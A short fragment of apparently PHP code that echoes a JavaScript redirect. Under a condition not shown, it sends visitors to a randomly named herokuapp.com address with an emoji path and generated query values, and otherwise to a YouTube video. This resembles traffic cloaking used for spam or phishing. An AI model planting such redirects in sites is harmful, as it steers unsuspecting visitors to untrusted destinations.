...
echo "        {\n";
echo "         window.location = \"https://cvnhjgfjgtyi.herokuapp.com/🥼🦺👔👕👖?\"+ h(13, '')+\"/?ref=bookmarks\";\n";
echo "        }else\n";
echo "{\n";
echo " window.location = \"https://www.youtube.com/watch?v=kvpyJNXpp64?\"+ h(23, '')+\"/?ref=bookmarks\";\n";
echo "}\n";
echo "//]]>\n";
echo "</script>\n";
echo "\n";
